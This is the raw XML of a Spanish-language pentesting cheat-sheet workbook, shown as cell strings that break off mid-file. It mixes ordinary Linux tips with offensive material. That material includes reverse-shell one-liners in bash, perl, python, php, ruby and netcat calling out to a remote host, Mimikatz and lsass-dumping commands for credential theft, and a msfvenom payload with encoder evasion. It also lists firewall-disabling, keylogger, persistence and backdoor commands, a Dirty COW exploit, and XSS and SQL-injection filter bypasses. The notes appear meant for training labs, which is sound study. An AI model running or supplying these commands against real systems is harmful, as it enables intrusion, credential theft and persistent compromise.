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K.L\Desktop\"/>
    </mc:Choice>
  </mc:AlternateContent>
  <bookViews>
    <workbookView xWindow="0" yWindow="0" windowWidth="51600" windowHeight="17700" activeTab="4"/>
  </bookViews>
  <sheets>
    <sheet name="Inicio" sheetId="3" r:id="rId1"/>
    <sheet name="General" sheetId="1" r:id="rId2"/>
    <sheet name="Reconocimiento &amp; Informacion" sheetId="4" r:id="rId3"/>
    <sheet name="Enumeracion &amp; Escaneos" sheetId="8" r:id="rId4"/>
    <sheet name="Explotacion &amp; Post-Explotacion" sheetId="6" r:id="rId5"/>
    <sheet name="Interceptadores &amp; Web" sheetId="9" r:id="rId6"/>
    <sheet name="Inyecciones" sheetId="7" r:id="rId7"/>
    <sheet name="Wireless" sheetId="10" r:id="rId8"/>
    <sheet name="Red Team" sheetId="12" r:id="rId9"/>
    <sheet name="Reversing &amp; Forensics" sheetId="15" r:id="rId10"/>
    <sheet name="Parseo Gitbook" sheetId="13" r:id="rId11"/>
  </sheet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1" i="13" l="1"/>
  <c r="G31" i="13"/>
  <c r="F31" i="13"/>
  <c r="H30" i="13"/>
  <c r="G30" i="13"/>
  <c r="F30" i="13"/>
  <c r="H29" i="13"/>
  <c r="G29" i="13"/>
  <c r="F29" i="13"/>
  <c r="H28" i="13"/>
  <c r="G28" i="13"/>
  <c r="F28" i="13"/>
  <c r="H27" i="13"/>
  <c r="G27" i="13"/>
  <c r="F27" i="13"/>
  <c r="H26" i="13"/>
  <c r="G26" i="13"/>
  <c r="F26" i="13"/>
  <c r="H25" i="13"/>
  <c r="G25" i="13"/>
  <c r="F25" i="13"/>
  <c r="H24" i="13"/>
  <c r="G24" i="13"/>
  <c r="F24" i="13"/>
  <c r="H23" i="13"/>
  <c r="G23" i="13"/>
  <c r="F23" i="13"/>
  <c r="H22" i="13"/>
  <c r="G22" i="13"/>
  <c r="F22" i="13"/>
  <c r="H21" i="13"/>
  <c r="G21" i="13"/>
  <c r="F21" i="13"/>
  <c r="H20" i="13"/>
  <c r="G20" i="13"/>
  <c r="F20" i="13"/>
  <c r="H19" i="13"/>
  <c r="G19" i="13"/>
  <c r="F19" i="13"/>
  <c r="H18" i="13"/>
  <c r="G18" i="13"/>
  <c r="F18" i="13"/>
  <c r="H17" i="13"/>
  <c r="G17" i="13"/>
  <c r="F17" i="13"/>
  <c r="Q16" i="13"/>
  <c r="H16" i="13"/>
  <c r="G16" i="13"/>
  <c r="F16" i="13"/>
  <c r="Q15" i="13"/>
  <c r="H15" i="13"/>
  <c r="G15" i="13"/>
  <c r="F15" i="13"/>
  <c r="Q14" i="13"/>
  <c r="H14" i="13"/>
  <c r="G14" i="13"/>
  <c r="F14" i="13"/>
  <c r="Q13" i="13"/>
  <c r="H13" i="13"/>
  <c r="G13" i="13"/>
  <c r="F13" i="13"/>
  <c r="Q12" i="13"/>
  <c r="H12" i="13"/>
  <c r="G12" i="13"/>
  <c r="F12" i="13"/>
  <c r="Q11" i="13"/>
  <c r="H11" i="13"/>
  <c r="G11" i="13"/>
  <c r="F11" i="13"/>
  <c r="Q10" i="13"/>
  <c r="H10" i="13"/>
  <c r="G10" i="13"/>
  <c r="F10" i="13"/>
  <c r="Q9" i="13"/>
  <c r="H9" i="13"/>
  <c r="G9" i="13"/>
  <c r="F9" i="13"/>
  <c r="Q8" i="13"/>
  <c r="H8" i="13"/>
  <c r="G8" i="13"/>
  <c r="F8" i="13"/>
  <c r="Q7" i="13"/>
  <c r="H7" i="13"/>
  <c r="G7" i="13"/>
  <c r="F7" i="13"/>
  <c r="H6" i="13"/>
  <c r="G6" i="13"/>
  <c r="F6" i="13"/>
  <c r="H5" i="13"/>
  <c r="G5" i="13"/>
  <c r="F5" i="13"/>
  <c r="H4" i="13"/>
  <c r="G4" i="13"/>
  <c r="F4" i="13"/>
  <c r="H3" i="13"/>
  <c r="G3" i="13"/>
  <c r="F3" i="13"/>
  <c r="F2" i="13"/>
  <c r="F1" i="13"/>
  <c r="E2" i="3"/>
</calcChain>
</file>

<file path=xl/sharedStrings.xml><?xml version="1.0" encoding="utf-8"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="2400" uniqueCount="1932">
  <si>
    <t>CheatSheet</t>
  </si>
  <si>
    <t>Comando</t>
  </si>
  <si>
    <t>Descripcion</t>
  </si>
  <si>
    <t>Anotaciones</t>
  </si>
  <si>
    <t>apt-get update</t>
  </si>
  <si>
    <t>Actualiza repositorios</t>
  </si>
  <si>
    <t>apt-get upgrade</t>
  </si>
  <si>
    <t>apt autoremove</t>
  </si>
  <si>
    <t>apt-get update &amp;&amp; apt-get full-upgrade</t>
  </si>
  <si>
    <t>apt-get dist-upgrade</t>
  </si>
  <si>
    <t>KALI</t>
  </si>
  <si>
    <t>Actualizar sistema con todas las actualizaciones posibles</t>
  </si>
  <si>
    <t xml:space="preserve">Elimina paquetes no necesarios </t>
  </si>
  <si>
    <t>Actualiza los paquetes incluso los que no estan instalados upgrade solo actualiza si el paquete esta instalado dist-upgrade instala nuevos paquetes para resolver las dependencias</t>
  </si>
  <si>
    <t>sudo updatedb</t>
  </si>
  <si>
    <t>COMANDOS</t>
  </si>
  <si>
    <t>python -c 'import pty;pty.spawn("/bin/bash")'</t>
  </si>
  <si>
    <t>Traer una Shell en Bash Python</t>
  </si>
  <si>
    <t>cat pass.txt | sort | uniq &gt; pass-listos.txt</t>
  </si>
  <si>
    <t>Quitar duplicado en un archivo</t>
  </si>
  <si>
    <t>Para quitar duplicados por ejemplo de diccionarios</t>
  </si>
  <si>
    <t>setxkbmap es</t>
  </si>
  <si>
    <t>Poner teclado en Español</t>
  </si>
  <si>
    <t>nessus_connect admin:contraseña@127.0.0.1:8834</t>
  </si>
  <si>
    <t xml:space="preserve">Control C </t>
  </si>
  <si>
    <t xml:space="preserve">Control Z </t>
  </si>
  <si>
    <t xml:space="preserve">Control D  </t>
  </si>
  <si>
    <t>Maquinas</t>
  </si>
  <si>
    <t>osboxes.org</t>
  </si>
  <si>
    <t>Contraseña osboxes.org</t>
  </si>
  <si>
    <t>vulnhub.com</t>
  </si>
  <si>
    <t>Maquinas Vulnerables</t>
  </si>
  <si>
    <t>&amp;</t>
  </si>
  <si>
    <t>Poner &amp; detras de la ejecucion de algo para dejarlo corriendo en Background y poder seguir usando la terminal</t>
  </si>
  <si>
    <t>kill -9 y el PID</t>
  </si>
  <si>
    <t>Para matar un proceso</t>
  </si>
  <si>
    <t>killall - 9 "nombre de proceso"</t>
  </si>
  <si>
    <t>bg</t>
  </si>
  <si>
    <t>fb</t>
  </si>
  <si>
    <t>cat test.txt | cat test.txt</t>
  </si>
  <si>
    <t>uname -a</t>
  </si>
  <si>
    <t>man "comando"</t>
  </si>
  <si>
    <t>Nos enseña la ayuda del comando</t>
  </si>
  <si>
    <t>Control L</t>
  </si>
  <si>
    <t>su "usuario"</t>
  </si>
  <si>
    <t>history | awk '{a[$2]++}END{for(i in a){print a[i] " " i}}' | sort -rn | head</t>
  </si>
  <si>
    <t>Visualizar una lista basada en el historial del terminal del Sistema ordenados desde el usado con mayor frecuencia al menor.</t>
  </si>
  <si>
    <t xml:space="preserve">history  </t>
  </si>
  <si>
    <t>DORKS BUSQUEDA</t>
  </si>
  <si>
    <t>&amp;&amp;</t>
  </si>
  <si>
    <t>Para concatenar sentencias de busquedas</t>
  </si>
  <si>
    <t>Google</t>
  </si>
  <si>
    <t>GHDB</t>
  </si>
  <si>
    <t>Dorks google</t>
  </si>
  <si>
    <t>ip:</t>
  </si>
  <si>
    <t>Bing</t>
  </si>
  <si>
    <t>net "rango ip"</t>
  </si>
  <si>
    <t>Shodan</t>
  </si>
  <si>
    <t>Shodan para escanear un rango apache net: "ip" port 80</t>
  </si>
  <si>
    <t>org "nombre organización"</t>
  </si>
  <si>
    <t>NMAP</t>
  </si>
  <si>
    <t>-sn o ping sweep</t>
  </si>
  <si>
    <t>-Pn</t>
  </si>
  <si>
    <t>Para no hacer ping, directamente escanea</t>
  </si>
  <si>
    <t>-sP</t>
  </si>
  <si>
    <t>No escanea, para comprobar equipos</t>
  </si>
  <si>
    <t>--top-ports=10</t>
  </si>
  <si>
    <t>Se puede poner los 100 puertos o los 1000</t>
  </si>
  <si>
    <t>--open</t>
  </si>
  <si>
    <t>-oA</t>
  </si>
  <si>
    <t>Para salvar o guardar el escaneo</t>
  </si>
  <si>
    <t>-iL</t>
  </si>
  <si>
    <t>Para escanear un archivo con direcciones ip</t>
  </si>
  <si>
    <t>-n</t>
  </si>
  <si>
    <t>Lo guarda en 3 formatos</t>
  </si>
  <si>
    <t>-oX</t>
  </si>
  <si>
    <t>Guarda el escaneo en xml</t>
  </si>
  <si>
    <t>Es el formato que utiliza metasploit</t>
  </si>
  <si>
    <t>NETCAT</t>
  </si>
  <si>
    <t>nc -z "ip" "puerto" -v</t>
  </si>
  <si>
    <t>Para escanear puertos abiertos</t>
  </si>
  <si>
    <t>fierce -dns "dominio"</t>
  </si>
  <si>
    <t>locate</t>
  </si>
  <si>
    <t>whereis</t>
  </si>
  <si>
    <t>find</t>
  </si>
  <si>
    <t>METASPLOIT</t>
  </si>
  <si>
    <t>w</t>
  </si>
  <si>
    <t>windows/vncinject/reverse_tcp</t>
  </si>
  <si>
    <t>METASPLOIT PAYLOAD</t>
  </si>
  <si>
    <t>Control Z</t>
  </si>
  <si>
    <t>back</t>
  </si>
  <si>
    <t>ARMITAGE</t>
  </si>
  <si>
    <t>Hilary Mail</t>
  </si>
  <si>
    <t>Autopawn</t>
  </si>
  <si>
    <t>METERPRETER</t>
  </si>
  <si>
    <t>run checkvm</t>
  </si>
  <si>
    <t>run get_env</t>
  </si>
  <si>
    <t>run get_application_list</t>
  </si>
  <si>
    <t>run scraper</t>
  </si>
  <si>
    <t>rev2self</t>
  </si>
  <si>
    <t>EVASION</t>
  </si>
  <si>
    <t>netsh firewall show opmode</t>
  </si>
  <si>
    <t>shell windows</t>
  </si>
  <si>
    <t>netsh firewall set opmode mode = disable profile = all</t>
  </si>
  <si>
    <t>netsh firewall set opmode mode = disable</t>
  </si>
  <si>
    <t>Desactivar firewall</t>
  </si>
  <si>
    <t>keyscan_start</t>
  </si>
  <si>
    <t>Keylogger</t>
  </si>
  <si>
    <t>run vnc</t>
  </si>
  <si>
    <t>run persistence</t>
  </si>
  <si>
    <t>run metsvc</t>
  </si>
  <si>
    <t>Backdoor</t>
  </si>
  <si>
    <t>multihandler windows/metsvc para conectarnos</t>
  </si>
  <si>
    <t>run enum_logged_on_user</t>
  </si>
  <si>
    <t>ELEVACION DE PRIVILEGIOS</t>
  </si>
  <si>
    <t>getsystem</t>
  </si>
  <si>
    <t>exploit/windows/local/bypassuac</t>
  </si>
  <si>
    <t>Dejar una session en Background de meterpreter y usar el exploit</t>
  </si>
  <si>
    <t>route add 10.1.1.0/24 255.255.255.0 "sesion"</t>
  </si>
  <si>
    <t>Para pasar de una Shell a un meterpreter</t>
  </si>
  <si>
    <t>use post/multi/manage/shell_to_meterpreter</t>
  </si>
  <si>
    <t>LOCALIZAR COSAS</t>
  </si>
  <si>
    <t>MAQUINAS &amp; LABS</t>
  </si>
  <si>
    <t>Terminal Terminator</t>
  </si>
  <si>
    <t>Se puede dividir la terminal</t>
  </si>
  <si>
    <t>apt-get install shellter</t>
  </si>
  <si>
    <t>ANALIZADOR DE VIRUS</t>
  </si>
  <si>
    <t>unshadow /etc/passwd /etc/shadow</t>
  </si>
  <si>
    <t>Fusionar las contraseñas en linux modernos</t>
  </si>
  <si>
    <t>OTROS</t>
  </si>
  <si>
    <t>receivefreesms</t>
  </si>
  <si>
    <t>Activo</t>
  </si>
  <si>
    <t>dpkg -i</t>
  </si>
  <si>
    <t>df</t>
  </si>
  <si>
    <t>finger</t>
  </si>
  <si>
    <t>"usuario" para buscar informacion de un usuario</t>
  </si>
  <si>
    <t>uptime</t>
  </si>
  <si>
    <t>configure, make, make install</t>
  </si>
  <si>
    <t>htop</t>
  </si>
  <si>
    <t>ps -all</t>
  </si>
  <si>
    <t>History | grep "comando"</t>
  </si>
  <si>
    <t>head "archivo" -n "lineas"</t>
  </si>
  <si>
    <t>tail "archivo" -n "lineas"</t>
  </si>
  <si>
    <t>cat recursos.txt | grep -i pruebas</t>
  </si>
  <si>
    <t>Para buscar dentro de un archivo de texto una cadena</t>
  </si>
  <si>
    <t>leakbase.pw</t>
  </si>
  <si>
    <t>dnsdumpster</t>
  </si>
  <si>
    <t>MIMIKATZ (Kiwi version moderna)</t>
  </si>
  <si>
    <t>privilege::debug</t>
  </si>
  <si>
    <t>sekurlsa::logonpasswords</t>
  </si>
  <si>
    <t>privilege::debug sekurlsa::logonpasswords exit &gt; credencionales.txt</t>
  </si>
  <si>
    <t xml:space="preserve">Tambien se puede invocar Mimikatz.exe y pasarle con un espacio los argumentos que queremos que use </t>
  </si>
  <si>
    <t>PSTools</t>
  </si>
  <si>
    <t>PSExec.exe \\"IP" -u WinXP-2-Udemy\usuario -p "contraseña" cmd.exe</t>
  </si>
  <si>
    <t>Meter solamente dominio si lo tiene</t>
  </si>
  <si>
    <t>use exploit/windows/smb/psexec para Kali</t>
  </si>
  <si>
    <t>Desde Kali nos abre un meterpreter</t>
  </si>
  <si>
    <t>PSExec para conectarnos como si fuera SSH a windows por el protocolo SMB, hace falta un usuario y contraseña, se puede mandar ejecutar mimikatz y vemos el resultado en nuestro ordenador</t>
  </si>
  <si>
    <t>PSExec.exe \\"IP" -u WinXP-2-Udemy\usuario -p "contraseña" -c mimikatz.exe privilege::debug sekurlsa::logonpasswords exit &gt; credencionales.txt</t>
  </si>
  <si>
    <t>use exploit/windows/smb/psexec</t>
  </si>
  <si>
    <t>Nos abre un meterpreter</t>
  </si>
  <si>
    <t>ejecutar cmd por smb</t>
  </si>
  <si>
    <t>Koon-bot</t>
  </si>
  <si>
    <t>ro i\initd=/install</t>
  </si>
  <si>
    <t>Unix Grub pulsar e para editar los comandos del boot probar a usar startx entorno grafico</t>
  </si>
  <si>
    <t>cat /etc/passwd</t>
  </si>
  <si>
    <t>apt -y install veil (enter) /usr/share/veil/config/setup.sh --force --silent</t>
  </si>
  <si>
    <t>Owaspbwap</t>
  </si>
  <si>
    <t>Listado de maquinas web vulnerables para hacer todo tipo de pruebas, pruebas de entrenamiento, aplicaciones reales vulnerables intencionadamente</t>
  </si>
  <si>
    <t>web for pentester</t>
  </si>
  <si>
    <t>apt-get install owasp-mantra-ff</t>
  </si>
  <si>
    <t>https://github.com/SVelizDonoso/wingkalabs</t>
  </si>
  <si>
    <t>Maquinas Vulnerables web para practicar Owasp</t>
  </si>
  <si>
    <t>bWAPP bee:bug</t>
  </si>
  <si>
    <t>bWAPP</t>
  </si>
  <si>
    <t>Owasp PHP</t>
  </si>
  <si>
    <t>Alternativa fuerza bruta crack online</t>
  </si>
  <si>
    <t>/usr/share/windows-binaries/plin.exe</t>
  </si>
  <si>
    <t>SSH para windows</t>
  </si>
  <si>
    <t>Plink</t>
  </si>
  <si>
    <t>CRACKING</t>
  </si>
  <si>
    <t>medusa -u "usuario" -p "contraseña" -h "host" -m "servicio a atacar"</t>
  </si>
  <si>
    <t>msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost="ip" lport="IP" -e x86/shikata_ga_nai -i 3 -f exe -o test.exe</t>
  </si>
  <si>
    <t>Crear con msfvenom y poner a la escucha con el multi handler</t>
  </si>
  <si>
    <t>lsass</t>
  </si>
  <si>
    <t>procdump.exe -na lsass.exe lsassdump --accepteula</t>
  </si>
  <si>
    <t>procdump herramienta legitima de microsoft para sacar la sam del lsass</t>
  </si>
  <si>
    <t>Comandos</t>
  </si>
  <si>
    <t>grep "href=" index.html | cut -d "/" -f 3 | grep "\." | cut -d '"' -f 1 | sort -u &gt; lista.txt</t>
  </si>
  <si>
    <t>SCRIPTING</t>
  </si>
  <si>
    <t>Identificación de patrón y listado en claro de los dominios con Wget</t>
  </si>
  <si>
    <t xml:space="preserve">Bash Scripting de wget de una pagina </t>
  </si>
  <si>
    <t>for url in $(cat list.txt); do host $url; done | grep "has address" | cut -d " " -f 4 | sort -u &gt; ips.txt</t>
  </si>
  <si>
    <t>Automatización para la resolución de los dominios</t>
  </si>
  <si>
    <t>apt-get install cherrytree</t>
  </si>
  <si>
    <t>Mailinator</t>
  </si>
  <si>
    <t>Email Temporal</t>
  </si>
  <si>
    <t>buscar con robtex los servidores de email con la misma direccion IP que mailinator, por ejemplo "pepe796@secknow.info" y nos llegara el correo a la cuenta de mailinator</t>
  </si>
  <si>
    <t>SSH ENUM</t>
  </si>
  <si>
    <t>Enum_SSH_45233</t>
  </si>
  <si>
    <t>OpenSSH version &lt; 7.7</t>
  </si>
  <si>
    <t>Enumeracion de usuarios OpenSSH</t>
  </si>
  <si>
    <t>check</t>
  </si>
  <si>
    <t>Comprueba el exploit seleccionado contra el objetivo para ver si es vulnerable</t>
  </si>
  <si>
    <t>DIRTY-COW</t>
  </si>
  <si>
    <t>Compilar Dirty-Cow.c</t>
  </si>
  <si>
    <t>Linux Kernel 2.6.22 &lt; 3.9</t>
  </si>
  <si>
    <t>Escanear subdominios</t>
  </si>
  <si>
    <t>knock</t>
  </si>
  <si>
    <t>SUBDOMINIOS</t>
  </si>
  <si>
    <t>gunzip</t>
  </si>
  <si>
    <t>vpsinfo.com</t>
  </si>
  <si>
    <t>crt.sh</t>
  </si>
  <si>
    <t>wc -l</t>
  </si>
  <si>
    <t>MANTRA</t>
  </si>
  <si>
    <t>pestaña Form --&gt; Enable Form Details</t>
  </si>
  <si>
    <t>HTTP Live Header</t>
  </si>
  <si>
    <t>Miscellaneos --&gt; Display Hidden Elements</t>
  </si>
  <si>
    <t>ZAP</t>
  </si>
  <si>
    <t>URL to attack --&gt; attack</t>
  </si>
  <si>
    <t>Alerts</t>
  </si>
  <si>
    <t>BURP SUITE</t>
  </si>
  <si>
    <t>Extender</t>
  </si>
  <si>
    <t>Totalmente recomendable hacerlo</t>
  </si>
  <si>
    <t>DIRBUSTER</t>
  </si>
  <si>
    <t>XSS</t>
  </si>
  <si>
    <t>SQL</t>
  </si>
  <si>
    <t>&lt;img+src=1+onerror=alert(1)+/&gt;</t>
  </si>
  <si>
    <t>&lt;Scri&lt;Script&gt;pt&gt;alert(123)&lt;/sCr&lt;/Script&lt;ipt&gt;</t>
  </si>
  <si>
    <t>&lt;ScRI&lt;ScrIpt&gt;pt&gt;alert(123)&lt;/sCr&lt;/ScRipt&lt;ipt&gt;</t>
  </si>
  <si>
    <t>ROBO DE SESSIONES COOKIE XSS</t>
  </si>
  <si>
    <t>' or '1'='1' -- -</t>
  </si>
  <si>
    <t>&lt;a onmouseover="alert('XSS')"&gt;Enlace&lt;/a&gt;</t>
  </si>
  <si>
    <t>&lt;IMG SRC=# onmouseover="alert('XSS')"&gt;</t>
  </si>
  <si>
    <t>&lt;IMG SRC=/ onerror="alert('XSS')"&gt;</t>
  </si>
  <si>
    <t>&lt;SCRIpT&gt;alert(String.fromCharCode(88,83,83))&lt;/ScrIPT&gt;</t>
  </si>
  <si>
    <t>arp -a</t>
  </si>
  <si>
    <t>apt-get install bettercap</t>
  </si>
  <si>
    <t>apt-get install alien</t>
  </si>
  <si>
    <t>uname -r</t>
  </si>
  <si>
    <t>gcc Dirty-Cow.c -o Dirty -pthread &amp;&amp; ./Dirty &amp;&amp; echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs</t>
  </si>
  <si>
    <t>ZENMAP</t>
  </si>
  <si>
    <t>wget https://nmap.org/dist/zenmap-7.80-1.noarch.rpm</t>
  </si>
  <si>
    <t>Obtener la ultima version GUI Zenmap</t>
  </si>
  <si>
    <t>sudo alien "name of downloaded package.rpm"</t>
  </si>
  <si>
    <t>sudo dpkg -i "name of converted package.deb"</t>
  </si>
  <si>
    <t>DIFERENCIAS CONCATENAR</t>
  </si>
  <si>
    <t>|</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">cmd1 </t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF666600"/>
        <rFont val="Inconsolata"/>
        <family val="3"/>
      </rPr>
      <t>|</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Inconsolata"/>
        <family val="3"/>
      </rPr>
      <t xml:space="preserve"> cmd2</t>
    </r>
  </si>
  <si>
    <t>hará que los dos (o más) comandos se ejecuten de manera simultanea.</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">cmd1 </t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF666600"/>
        <rFont val="Inconsolata"/>
        <family val="3"/>
      </rPr>
      <t>&amp;</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Inconsolata"/>
        <family val="3"/>
      </rPr>
      <t xml:space="preserve"> cmd2</t>
    </r>
  </si>
  <si>
    <t>||</t>
  </si>
  <si>
    <t>El segundo comando se ejecutará si el primero termina sin éxito.</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">cmd1 </t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF666600"/>
        <rFont val="Inconsolata"/>
        <family val="3"/>
      </rPr>
      <t>||</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Inconsolata"/>
        <family val="3"/>
      </rPr>
      <t xml:space="preserve"> cmd2</t>
    </r>
  </si>
  <si>
    <t>El segundo comando se ejecutará solo si el primero termina con éxito.</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">cmd1 </t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF666600"/>
        <rFont val="Inconsolata"/>
        <family val="3"/>
      </rPr>
      <t>&amp;&amp;</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Inconsolata"/>
        <family val="3"/>
      </rPr>
      <t xml:space="preserve"> cmd2</t>
    </r>
  </si>
  <si>
    <t>;</t>
  </si>
  <si>
    <t>El segundo comando se ejecutará sin importar el resultado del primero.</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">cmd1 </t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF666600"/>
        <rFont val="Inconsolata"/>
        <family val="3"/>
      </rPr>
      <t>;</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Inconsolata"/>
        <family val="3"/>
      </rPr>
      <t xml:space="preserve"> cmd2</t>
    </r>
  </si>
  <si>
    <t>WIRESHARK</t>
  </si>
  <si>
    <t xml:space="preserve"> http contains "pagina web"</t>
  </si>
  <si>
    <t>eth.src == "IP"</t>
  </si>
  <si>
    <t>ip.addr == "IP"</t>
  </si>
  <si>
    <t>ip.dst == "IP"</t>
  </si>
  <si>
    <t>tcp.port == 80</t>
  </si>
  <si>
    <t>tcp.srcport == 80</t>
  </si>
  <si>
    <t>http.host =="pagina web" &amp;&amp; http.contains "pass"</t>
  </si>
  <si>
    <t>statistics conversations</t>
  </si>
  <si>
    <t>EVASIONES</t>
  </si>
  <si>
    <t>+</t>
  </si>
  <si>
    <t>aNd</t>
  </si>
  <si>
    <t>En SQL Injection como en XSS se puede poner aNd y funciona como un and</t>
  </si>
  <si>
    <t>/**/</t>
  </si>
  <si>
    <t>/*!uNion*/</t>
  </si>
  <si>
    <t>char(117,115....</t>
  </si>
  <si>
    <t>nospace</t>
  </si>
  <si>
    <t xml:space="preserve">sqlmap.py -r </t>
  </si>
  <si>
    <t>--level=5</t>
  </si>
  <si>
    <t>--risk=5</t>
  </si>
  <si>
    <t>--dbs</t>
  </si>
  <si>
    <t>--sql-shell</t>
  </si>
  <si>
    <t>--dbms</t>
  </si>
  <si>
    <t>--current-db</t>
  </si>
  <si>
    <t>--current-user </t>
  </si>
  <si>
    <t>Usuario que esta corriendo la BD</t>
  </si>
  <si>
    <t>BD que usa actualmente</t>
  </si>
  <si>
    <t>-D</t>
  </si>
  <si>
    <t>BD a analizar</t>
  </si>
  <si>
    <t>--tables</t>
  </si>
  <si>
    <t>-T</t>
  </si>
  <si>
    <t>Nombre de tabla especifica</t>
  </si>
  <si>
    <t>--columns</t>
  </si>
  <si>
    <t>-C</t>
  </si>
  <si>
    <t>Nombre de la columna especifica</t>
  </si>
  <si>
    <t>--dump</t>
  </si>
  <si>
    <t>--dump-all</t>
  </si>
  <si>
    <t>--os-shell</t>
  </si>
  <si>
    <t>Requisitos que el folder tenga permisos de escritura y privilegios</t>
  </si>
  <si>
    <t>--cookie "cookie de session"</t>
  </si>
  <si>
    <t>Para acceder a formularios en los que estemos logueados con nuestra cookie.</t>
  </si>
  <si>
    <t>creo que el maximo es 3</t>
  </si>
  <si>
    <t>SQLMAP</t>
  </si>
  <si>
    <t>limit</t>
  </si>
  <si>
    <t xml:space="preserve">Si realizamos la inyeccion de SQL y solo nos devuelve 1 fila es que tiene limit 1, para solo mostrar 1 fila </t>
  </si>
  <si>
    <t>Es un mecanismo de seguridad, poner delante de limit -- o #</t>
  </si>
  <si>
    <t>BETTERCAP</t>
  </si>
  <si>
    <t>-X</t>
  </si>
  <si>
    <t>CAIN</t>
  </si>
  <si>
    <t>DHCP ROGUE</t>
  </si>
  <si>
    <t>echo "1" &gt; /proc/sys/net/ipv4/ip_forward</t>
  </si>
  <si>
    <t>Si no se estrellarian contra nosotros</t>
  </si>
  <si>
    <t>airmon-ng check kill</t>
  </si>
  <si>
    <t>airmon-ng start wlan0</t>
  </si>
  <si>
    <t>airodump-ng wlan0mon</t>
  </si>
  <si>
    <t>Wifite</t>
  </si>
  <si>
    <t>Framework Phishing</t>
  </si>
  <si>
    <t>whois.domaintools.com</t>
  </si>
  <si>
    <t>https://sitereport.netcraft.com/</t>
  </si>
  <si>
    <t>Muy bueno</t>
  </si>
  <si>
    <t>0x</t>
  </si>
  <si>
    <t>Se pueden hacer inyecciones de SQL en hexadecimal poniendo delante 0x de lo que encodeemos para que la BD entienda que es hexadecimal</t>
  </si>
  <si>
    <t>hashkiller.co.uk</t>
  </si>
  <si>
    <t>temp-mail.org</t>
  </si>
  <si>
    <t>En Hydra añadir :F="Mensaje de error"</t>
  </si>
  <si>
    <t>sudo apt-get update &amp;&amp; sudo apt-get install sublime-text</t>
  </si>
  <si>
    <t>wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add -</t>
  </si>
  <si>
    <t>echo "deb https://download.sublimetext.com/ apt/stable/" | sudo tee /etc/apt/sources.list.d/sublime-text.list</t>
  </si>
  <si>
    <t>ngrok</t>
  </si>
  <si>
    <t>rpcinfo -p "IP"</t>
  </si>
  <si>
    <t>tnscmd.pl</t>
  </si>
  <si>
    <t>Para auditar el TNS de Oracle</t>
  </si>
  <si>
    <t>ssh "&lt;?passthru(base64_decode('nc -e /bin/sh');?&gt;"@IP</t>
  </si>
  <si>
    <t>union select  y load_file('/etc/passwd')</t>
  </si>
  <si>
    <t>WEEVELY</t>
  </si>
  <si>
    <t>weevely generate 1234 /root/shell.php</t>
  </si>
  <si>
    <t>bash -i &gt;&amp; /dev/tcp/8.8.8.8/8080 0&gt;&amp;1</t>
  </si>
  <si>
    <t>perl -e 'use Socket;$i="8.8.8.8";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</t>
  </si>
  <si>
    <t>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("8.8.8.8",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</t>
  </si>
  <si>
    <t>php -r '$sock=fsockopen("8.8.8.8",8080);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</t>
  </si>
  <si>
    <t>ruby -rsocket -e'f=TCPSocket.open("8.8.8.8",8080).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</t>
  </si>
  <si>
    <t>nc -e /bin/sh 8.8.8.8 8080</t>
  </si>
  <si>
    <t xml:space="preserve">WIFI </t>
  </si>
  <si>
    <t>VPN</t>
  </si>
  <si>
    <t>ike-scan -M -A -P "IP"</t>
  </si>
  <si>
    <t>https://anonymousemail.me/send.php</t>
  </si>
  <si>
    <r>
      <t>Wifiphisher</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF44494F"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t> </t>
    </r>
  </si>
  <si>
    <t>Para ataques wifi, ver en pestaña WIFI</t>
  </si>
  <si>
    <t>Time "proceso"</t>
  </si>
  <si>
    <t>Sparta o Legion</t>
  </si>
  <si>
    <t>Realiza pruebas de penetracion automatica</t>
  </si>
  <si>
    <t>Usa nmap Nikto Hydra y mas para realizar pentest automatico</t>
  </si>
  <si>
    <t>Busqueda en redes sociales por nombre y foto</t>
  </si>
  <si>
    <t>SOCIAL MAPPER</t>
  </si>
  <si>
    <t>Social Mapper</t>
  </si>
  <si>
    <t>sudo apt-get install unhide</t>
  </si>
  <si>
    <t>Para escanear en busca de rootkit ocultos en Linux</t>
  </si>
  <si>
    <t>site:dominio - site:dominio</t>
  </si>
  <si>
    <t>ipv4info.com</t>
  </si>
  <si>
    <t>dnsenum</t>
  </si>
  <si>
    <t>busqueda de dns</t>
  </si>
  <si>
    <t>seclist</t>
  </si>
  <si>
    <t>Online Malware Sandbox</t>
  </si>
  <si>
